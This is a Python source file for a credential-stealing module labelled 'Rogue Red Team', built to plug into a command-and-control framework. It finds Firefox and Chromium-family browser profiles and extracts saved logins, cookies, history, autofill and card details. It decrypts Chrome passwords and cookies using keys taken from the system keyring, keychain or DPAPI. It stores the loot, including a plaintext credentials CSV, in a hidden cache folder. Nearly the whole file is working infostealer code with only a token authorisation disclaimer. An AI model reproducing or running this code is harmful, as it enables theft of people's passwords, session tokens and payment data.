#!/usr/bin/env python3
"""
PAYLOAD: Browser Data Extraction Module
DESCRIPTION: Extract credentials, cookies, history, and bookmarks from browsers
AUTHOR: Rogue Red Team
VERSION: 3.0
SECURITY: This tool extracts sensitive browser data - Use only on authorized systems
"""
import os, sys, json, sqlite3, base64, hashlib, datetime, shutil, tempfile, re, platform
from pathlib import Path
try:
    from Cryptodome.Cipher import AES
except Exception:
    from Crypto.Cipher import AES
import subprocess, glob, zipfile, tarfile

class BrowserStealer:
    def __init__(self):
        self.results = {
            "firefox": {"profiles": [], "credentials": [], "cookies": [], "history": [], "bookmarks": []},
            "chrome": {"profiles": [], "credentials": [], "cookies": [], "history": [], "bookmarks": []},
            "edge": {"profiles": [], "credentials": [], "cookies": [], "history": [], "bookmarks": []},
            "brave": {"profiles": [], "credentials": [], "cookies": [], "history": [], "bookmarks": []},
            "safari": {"profiles": [], "credentials": [], "cookies": [], "history": [], "bookmarks": []}
        }
    
    def find_browser_profiles(self):
        """Locate browser profiles on the system"""
        browsers = {}
        
        # Common browser profile locations
        profile_paths = {
            "firefox": [
                "~/.mozilla/firefox/",
                "~/snap/firefox/common/.mozilla/firefox/",
                "/root/.mozilla/firefox/",
                os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles"),
            ],
            "chrome": [
                "~/.config/google-chrome/",
                "~/.config/chromium/",
                "~/snap/chromium/common/chromium/",
                "/root/.config/google-chrome/",
                os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
                os.path.expandvars(r"%LOCALAPPDATA%\Chromium\User Data"),
            ],
            "edge": [
                "~/.config/microsoft-edge/",
                "~/snap/microsoft-edge/common/microsoft-edge/",
                os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),
            ],
            "brave": [
                "~/.config/BraveSoftware/Brave-Browser/",
                "~/snap/brave/common/BraveSoftware/Brave-Browser/",
                os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"),
            ],
            "safari": [
                "~/Library/Safari/",
                "/Library/Safari/",
            ]
        }
        
        for browser, paths in profile_paths.items():
            for path_pattern in paths:
                expanded_path = os.path.expanduser(path_pattern)
                if os.path.exists(expanded_path):
                    if browser not in browsers:
                        browsers[browser] = []
                    browsers[browser].append(expanded_path)
        
        return browsers
    
    def extract_firefox_data(self, profile_path):
        """Extract all data from Firefox profile"""
        firefox_data = {}
        
        try:
            profile_name = os.path.basename(profile_path.rstrip('/'))
            firefox_data["profile_name"] = profile_name
            
            # Extract logins (encrypted)
            logins_file = os.path.join(profile_path, "logins.json")
            if os.path.exists(logins_file):
                with open(logins_file, 'r') as f:
                    logins = json.load(f)
                    firefox_data["logins"] = logins.get("logins", [])
            
            # Extract cookies
            cookies_file = os.path.join(profile_path, "cookies.sqlite")
            if os.path.exists(cookies_file):
                cookies = self.read_sqlite_db(cookies_file, "moz_cookies", ["host", "name", "value", "path", "expiry"])
                firefox_data["cookies"] = cookies[:50]  # Limit to 50
            
            # Extract history
            places_file = os.path.join(profile_path, "places.sqlite")
            if os.path.exists(places_file):
                history = self.read_sqlite_db(places_file, "moz_places", 
                                            ["url", "title", "visit_count", "last_visit_date"])
                firefox_data["history"] = history[:100]  # Limit to 100
            
            # Extract bookmarks
            if os.path.exists(places_file):
                bookmarks = self.read_sqlite_db(places_file, "moz_bookmarks", 
                                              ["title", "dateAdded", "lastModified"])
                firefox_data["bookmarks"] = bookmarks[:50]
            
            # Extract form history
            formhistory_file = os.path.join(profile_path, "formhistory.sqlite")
            if os.path.exists(formhistory_file):
                forms = self.read_sqlite_db(formhistory_file, "moz_formhistory", 
                                          ["fieldname", "value", "timesUsed"])
                firefox_data["form_history"] = forms[:50]
            
            # Extract saved credit cards
            addons_file = os.path.join(profile_path, "addons.json")
            if os.path.exists(addons_file):
                with open(addons_file, 'r') as f:
                    addons = json.load(f)
                    firefox_data["addons"] = addons.get("addons", [])[:20]
            
        except Exception as e:
            firefox_data["error"] = str(e)
        
        return firefox_data
    
    def _chrome_profile_dirs(self, root):
        """Return actual profile directories under a chrome-family User Data root.
        Handles both a direct profile dir (contains Login Data etc.) and a root
        containing Default/Profile * subdirectories."""
        roots = [root]
        if os.path.isdir(root):
            for sub in sorted(os.listdir(root)):
                if sub.startswith(("Default", "Profile", "Guest")):
                    roots.append(os.path.join(root, sub))
        out = []
        for r in roots:
            if not os.path.isdir(r):
                continue
            if os.path.exists(os.path.join(r, "Preferences")) or os.path.exists(os.path.join(r, "Login Data")):
                out.append(r)
        # dedupe, keep order
        seen = set()
        return [r for r in out if not (r in seen or seen.add(r))]

    def extract_chrome_data(self, profile_path):
        """Extract all data from Chrome/Chromium profile"""
        chrome_data = {}
        
        try:
            profile_name = os.path.basename(profile_path.rstrip('/'))
            chrome_data["profile_name"] = profile_name
            
            # Extract login data (encrypted passwords)
            login_data_file = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_data_file):
                temp_db = self.copy_and_read_db(login_data_file)
                if temp_db:
                    query = """
                    SELECT origin_url, username_value, password_value, date_created 
                    FROM logins 
                    ORDER BY date_created DESC 
                    LIMIT 50
                    """
                    logins = self.execute_sql_query(temp_db, query)
                    
                    # Try to decrypt passwords
                    for login in logins:
                        if login.get("password_value"):
                            try:
                                decrypted = self.decrypt_chrome_password(login["password_value"])
                                login["password_decrypted"] = decrypted
                            except:
                                login["password_decrypted"] = "<encrypted>"
                    
                    chrome_data["logins"] = logins
                    os.unlink(temp_db)
            
            # Extract cookies
            cookies_file = os.path.join(profile_path, "Cookies")
            if os.path.exists(cookies_file):
                temp_db = self.copy_and_read_db(cookies_file)
                if temp_db:
                    query = """
                    SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly 
                    FROM cookies 
                    ORDER BY host_key 
                    LIMIT 100
                    """
                    
                    cookies = self.execute_sql_query(temp_db, query)
                    
                    # Try to decrypt encrypted cookies
                    for cookie in cookies:
                        if cookie.get("value"):
                            try:
                                decrypted = self.decrypt_chrome_cookie(cookie["value"])
                                cookie["value_decrypted"] = decrypted
                            except:
                                cookie["value_decrypted"] = cookie["value"]
                    
                    chrome_data["cookies"] = cookies
                    os.unlink(temp_db)
            
            # Extract history
            history_file = os.path.join(profile_path, "History")
            if os.path.exists(history_file):
                temp_db = self.copy_and_read_db(history_file)
                if temp_db:
                    queries = {
                        "urls": "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100",
                        "downloads": "SELECT target_path, start_time, end_time, received_bytes FROM downloads LIMIT 20",
                        "keyword_search": "SELECT term, normalized_term FROM keyword_search_terms LIMIT 20"
                    }
                    
                    for key, query in queries.items():
                        results = self.execute_sql_query(temp_db, query)
                        chrome_data[key] = results
                    
                    os.unlink(temp_db)
            
            # Extract bookmarks
            bookmarks_file = os.path.join(profile_path, "Bookmarks")
            if os.path.exists(bookmarks_file):
                with open(bookmarks_file, 'r', encoding='utf-8') as f:
                    bookmarks = json.load(f)
                    chrome_data["bookmarks_raw"] = bookmarks
            
            # Extract autofill data
            web_data_file = os.path.join(profile_path, "Web Data")
            if os.path.exists(web_data_file):
                temp_db = self.copy_and_read_db(web_data_file)
                if temp_db:
                    queries = {
                        "autofill": "SELECT name, value, date_created FROM autofill LIMIT 50",
                        "credit_cards": "SELECT name_on_card, expiration_month, expiration_year FROM credit_cards LIMIT 20"
                    }
                    
                    for key, query in queries.items():
                        results = self.execute_sql_query(temp_db, query)
                        chrome_data[key] = results
                    
                    os.unlink(temp_db)
            
        except Exception as e:
            chrome_data["error"] = str(e)
        
        return chrome_data
    
    def _chrome_encryption_key(self):
        """Resolve the Chrome/Edge/Brave AES key for this platform."""
        system = platform.system()
        try:
            if system == "Linux":
                key = None
                try:
                    import secretstorage
                    conn = secretstorage.dbus_init()
                    for item in secretstorage.get_default_collection(conn).get_all_items():
                        if item.get_label() == "Chrome Safe Storage":
                            key = item.get_secret()
                            break
                except Exception:
                    pass
                passphrase = key if key else b"peanuts"
                return hashlib.pbkdf2_hmac("sha1", passphrase, b"saltysalt", 1, 16)
            if system == "Darwin":
                key = subprocess.check_output(
                    ["security", "find-generic-password", "-w", "-s", "Chrome Safe Storage"],
                    stderr=subprocess.DEVNULL).strip()
                return hashlib.pbkdf2_hmac("sha1", key, b"saltysalt", 1, 16)
            if system == "Windows":
                import win32crypt
                base = os.environ.get("LOCALAPPDATA", "")
                for sub in (r"Google\Chrome\User Data", r"Microsoft\Edge\User Data",
                            r"BraveSoftware\Brave-Browser\User Data", r"Chromium\User Data"):
                    ls_path = os.path.join(base, sub, "Local State")
                    if os.path.exists(ls_path):
                        with open(ls_path, encoding="utf-8") as f:
                            ls = json.load(f)
                        enc = base64.b64decode(ls["os_crypt"]["encrypted_key"])
                        if enc.startswith(b"DPAPI"):
                            enc = enc[5:]
                        return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1]
        except Exception:
            pass
        return None

    def decrypt_chrome_password(self, encrypted_password):
        """Decrypt Chrome v10 (AES-GCM) and legacy (AES-CBC) password blobs."""
        try:
            if not encrypted_password:
                return "<empty>"
            enc = bytes(encrypted_password)
            key = self._chrome_encryption_key()
            if not key:
                return "<no key available>"
            if enc[:3] in (b"v10", b"v11"):
                # Chrome 80+: AES-128-GCM, nonce 12B after prefix, tag in tail
                nonce, ct, tag = enc[3:15], enc[15:-16], enc[-16:]
                c = AES.new(key, AES.MODE_GCM, nonce=nonce, mac_len=16)
                return c.decrypt_and_verify(ct, tag).decode("utf-8", "replace")
            if enc[:3] in (b"v1", b"v2", b"v3"):
                # legacy AES-128-CBC with fixed IV (pre-Chrome-80)
                c = AES.new(key, AES.MODE_CBC, IV=b" " * 16)
                pt = c.decrypt(enc[3:])
                pad = pt[-1] if pt and 0 < pt[-1] <= 16 else 0
                return pt[:-pad].decode("utf-8", "replace")
            return "<unsupported blob>"
        except Exception as e:
            return "<decryption failed: %s>" % str(e)[:60]

    def decrypt_chrome_cookie(self, encrypted_value):
        """Decrypt Chrome cookie value (v10/v11 blob, legacy, or plaintext)."""
        try:
            if isinstance(encrypted_value, str):
                return encrypted_value
            enc = bytes(encrypted_value)
            if enc[:3] in (b"v10", b"v11", b"v1", b"v2", b"v3"):
                return self.decrypt_chrome_password(enc)
            return enc.decode("utf-8", "replace")  # plaintext cookie
        except Exception:
            return "<cookie decrypt error>"
    
    def copy_and_read_db(self, db_path):
        """Copy SQLite database to temp location and read"""
        try:
            temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db').name
            shutil.copy2(db_path, temp_db)
            return temp_db
        except Exception as e:
            print(f"Error copying database: {e}")
            return None
    
    def read_sqlite_db(self, db_path, table, columns):
        """Read data from SQLite database"""
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            
            columns_str = ', '.join(columns)
            query = f"SELECT {columns_str} FROM {table} LIMIT 100"
            
            cursor.execute(query)
            rows = cursor.fetchall()
            
            result = []
            for row in rows:
                row_dict = {}
                for i, col in enumerate(columns):
                    row_dict[col] = row[i]
                result.append(row_dict)
            
            conn.close()
            return result
            
        except Exception as e:
            return [{"error": str(e)}]
    
    def execute_sql_query(self, db_path, query):
        """Execute SQL query on database"""
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute(query)
            
            columns = [description[0] for description in cursor.description]
            rows = cursor.fetchall()
            
            result = []
            for row in rows:
                row_dict = {}
                for i, col in enumerate(columns):
                    row_dict[col] = row[i]
                result.append(row_dict)
            
            conn.close()
            return result
            
        except Exception as e:
            return [{"error": str(e)}]
    
    def execute(self):
        """Execute browser data extraction"""
        try:
            print("[+] Starting browser data extraction...")
            
            # Find browser profiles
            browsers = self.find_browser_profiles()
            print(f"[+] Found browsers: {list(browsers.keys())}")
            
            # Extract data from each browser
            for browser, paths in browsers.items():
                print(f"[+] Processing {browser}...")
                
                for profile_path in paths:
                    if browser == "firefox":
                        # Firefox profiles are directories within the main path
                        if os.path.isdir(profile_path):
                            for profile_dir in os.listdir(profile_path):
                                full_path = os.path.join(profile_path, profile_dir)
                                if os.path.isdir(full_path):
                                    data = self.extract_firefox_data(full_path)
                                    self.results["firefox"]["profiles"].append(data)
                    
                    elif browser in ["chrome", "edge", "brave"]:
                        # Chrome-based browsers: iterate real profile dirs
                        if os.path.isdir(profile_path):
                            for profile_dir in self._chrome_profile_dirs(profile_path):
                                data = self.extract_chrome_data(profile_dir)
                                self.results[browser]["profiles"].append(data)
            
            # Generate summary
            summary = {
                "timestamp": datetime.datetime.now().isoformat(),
                "extraction_summary": {
                    "firefox_profiles": len(self.results["firefox"]["profiles"]),
                    "chrome_profiles": len(self.results["chrome"]["profiles"]),
                    "edge_profiles": len(self.results["edge"]["profiles"]),
                    "brave_profiles": len(self.results["brave"]["profiles"])
                },
                "total_credentials": sum(
                    len(p.get("logins", [])) 
                    for p in self.results["firefox"]["profiles"] + 
                          self.results["chrome"]["profiles"] + 
                          self.results["edge"]["profiles"] + 
                          self.results["brave"]["profiles"]
                ),
                "total_cookies": sum(
                    len(p.get("cookies", [])) 
                    for p in self.results["firefox"]["profiles"] + 
                          self.results["chrome"]["profiles"] + 
                          self.results["edge"]["profiles"] + 
                          self.results["brave"]["profiles"]
                )
            }
            
            # Save results
            output_dir = os.path.expanduser("~/.cache/.rogue/browser_data")
            os.makedirs(output_dir, exist_ok=True)
            
            output_file = os.path.join(output_dir, f"browser_data_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
            with open(output_file, 'w') as f:
                json.dump(self.results, f, indent=2, default=str)
            
            # Also create a condensed CSV of credentials
            csv_file = os.path.join(output_dir, f"credentials_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.csv")
            self.create_credentials_csv(csv_file)
            
            print(f"[+] Browser data extraction complete.")
            print(f"[+] Detailed results saved to: {output_file}")
            print(f"[+] Credentials CSV saved to: {csv_file}")
            
            return json.dumps(summary, indent=2)
            
        except Exception as e:
            return f"[!] Browser data extraction failed: {str(e)}"
    
    def create_credentials_csv(self, csv_file):
        """Create CSV file of extracted credentials"""
        try:
            import csv
            
            with open(csv_file, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(['Browser', 'Profile', 'URL', 'Username', 'Password', 'Date'])
                
                for browser in ['firefox', 'chrome', 'edge', 'brave']:
                    for profile in self.results[browser]["profiles"]:
                        profile_name = profile.get("profile_name", "Unknown")
                        
                        # Firefox logins
                        for login in profile.get("logins", []):
                            writer.writerow([
                                browser.capitalize(),
                                profile_name,
                                login.get("hostname", ""),
                                login.get("encryptedUsername", ""),
                                login.get("encryptedPassword", ""),
                                login.get("timeCreated", "")
                            ])
                        
                        # Chrome logins
                        for login in profile.get("logins", []):
                            writer.writerow([
                                browser.capitalize(),
                                profile_name,
                                login.get("origin_url", ""),
                                login.get("username_value", ""),
                                login.get("password_decrypted", login.get("password_value", "")),
                                login.get("date_created", "")
                            ])
            
        except Exception as e:
            print(f"[!] Error creating CSV: {e}")

# === Integration with Rogue C2 ===
def rogue_integration():
    """Wrapper for Rogue C2 integration"""
    stealer = BrowserStealer()
    return stealer.execute()

if __name__ == "__main__":
    print(rogue_integration())
